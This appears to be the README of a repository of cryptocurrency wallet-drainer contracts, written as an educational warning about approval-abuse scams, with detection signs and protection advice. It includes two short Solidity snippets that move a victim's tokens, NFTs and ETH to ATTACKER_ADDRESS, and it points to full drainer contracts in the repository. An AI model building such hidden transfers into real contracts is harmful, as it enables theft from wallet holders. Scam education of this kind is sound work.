# ⚠️ SECURITY WARNING: DRAINER SCAM PATTERN ⚠️

**IMPORTANT**: This repository contains code examples of malicious smart contract patterns that are used in cryptocurrency scams. These contracts and integration code are provided **FOR EDUCATIONAL PURPOSES ONLY** to help users identify and avoid scams.

## Understanding Drainer Scams

Drainer scams are a type of attack where users are tricked into interacting with malicious smart contracts that drain their wallets of all valuable assets (tokens, NFTs, and native cryptocurrency).

## How Drainer Scams Work

### 1. Phishing or Fake Websites

Scammers create convincing clones of legitimate cryptocurrency websites, often mimicking popular airdrop claims, NFT minting platforms, or token swaps. The websites look legitimate but contain malicious contract interactions.

### 2. Token Approval Exploitation

When users connect their wallets and try to claim "rewards," the contract:

- Requests unlimited approvals (`type(uint256).max`) for multiple tokens
- Requests `setApprovalForAll` for NFT collections
- Makes these requests appear legitimate through UI manipulation

### 3. Asset Draining

Once approvals are granted, the contract:

- Transfers all approved assets to the scammer's wallet
- May perform the promised action (like minting a token) to avoid suspicion
- Often occurs instantly or shortly after approvals are granted

## Common Indicators of Drainer Scams

1. **Too Good To Be True Offers**: Unusually large airdrops, free NFTs, or other rewards without clear eligibility criteria.

2. **Excessive Approval Requests**: Legitimate applications only request approvals for specific tokens and specific amounts needed.

3. **Multiple Approval Pop-ups**: A sudden series of MetaMask/wallet approval requests is suspicious.

4. **Unlimited Token Allowances**: Be extremely suspicious of any request for "unlimited" or very large approval amounts.

5. **Urgency**: Messages like "limited time offer" or "claim before it's gone" create pressure to act quickly without proper verification.

6. **Unverified Contracts**: Smart contracts that aren't verified on Etherscan or other block explorers.

7. **Unusual URLs**: Subtle misspellings or alternative domains (like .io instead of .com).

## How to Protect Yourself

1. **Always Verify the Website URL**: Check the website address carefully before connecting your wallet.

2. **Check Contract Approvals**:
   - For tokens: Only approve the exact amount needed, not unlimited amounts.
   - For NFTs: Be extremely cautious of `setApprovalForAll` requests.

3. **Use Approval Checking Tools**:
   - [Revoke.cash](https://revoke.cash/)
   - [Etherscan Token Approvals](https://etherscan.io/tokenapprovalchecker)

4. **Use a Hardware Wallet**: Hardware wallets provide an additional layer of security.

5. **Create a Separate Wallet for New Interactions**: Consider using a separate wallet with minimal funds for interacting with new protocols.

6. **Read the Contract Code**: If possible, read the contract code or wait for trusted community verification.

7. **Use Transaction Simulation Tools**: Tools like [Tenderly](https://tenderly.co/) can simulate transactions before execution.

## Technical Red Flags in Smart Contracts

When examining contract code, look for:

1. **Functions that transfer multiple asset types**: Legitimate contracts usually have focused functionality.

2. **Hidden transfer functions**: Functions named innocuously like "claim" or "register" that actually transfer assets.

3. **Try/catch blocks around transfers**: Malicious contracts often use these to silently continue if one token transfer fails.

4. **Hardcoded recipient addresses**: Especially if they're not documented or explained.

5. **Unusual access to user balance information**: Code that scans for user assets across multiple tokens/NFTs.

## Sample Attack Patterns

Here are examples of malicious code patterns to watch for:

### Hidden Token Transfers

```solidity
// Looks innocent but transfers all user tokens
function claimReward() external {
    // Mint some token to the user
    _mint(msg.sender, 1000);

    // Hidden functionality that transfers user's assets
    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    usdc.transferFrom(msg.sender, ATTACKER_ADDRESS, usdc.balanceOf(msg.sender));
}
```

### Multiple Asset Transfers

```solidity
// Transfers many types of assets in one function
function multiDrain(address user) internal {
    // Transfer ERC20 tokens
    for (uint i = 0; i < tokenList.length; i++) {
        IERC20(tokenList[i]).transferFrom(user, ATTACKER_ADDRESS, IERC20(tokenList[i]).balanceOf(user));
    }

    // Transfer NFTs
    for (uint i = 0; i < nftList.length; i++) {
        // Transfer all NFTs
    }

    // Transfer ETH
    payable(ATTACKER_ADDRESS).transfer(address(user).balance);
}
```

## What To Do If You've Been Scammed

1. **Revoke Remaining Approvals**: Immediately visit [Revoke.cash](https://revoke.cash/) to revoke any remaining approvals.

2. **Move Remaining Assets**: Transfer any assets you still have to a new, secure wallet.

3. **Report the Scam**: Report to relevant blockchain explorers, the exchange where you got your cryptocurrency, and law enforcement.

4. **Document Everything**: Save all transaction hashes, website URLs, and communications.

5. **Alert the Community**: Warn others about the scam to prevent more victims.

## In This Repository

The contracts in this repository demonstrate the patterns used in drainer scams:

- `MintDrainer.sol`: A basic drainer that takes ERC20 tokens
- `MintDrainerOptimized.sol`: A more advanced drainer that takes ERC20, ERC721, and native currency

These contracts are provided to help you understand how scams work, NOT to be used for malicious purposes.

## Resources

- [MetaMask Security Best Practices](https://metamask.io/security/)
- [Etherscan Token Approval Checker](https://etherscan.io/tokenapprovalchecker)
- [Revoke.cash - Approval Management](https://revoke.cash/)
- [Coinbase - How to Avoid Crypto Scams](https://www.coinbase.com/learn/crypto-basics/how-to-avoid-cryptocurrency-scams)

---

Remember: If something seems too good to be true, it probably is. Always verify before connecting your wallet or approving transactions.
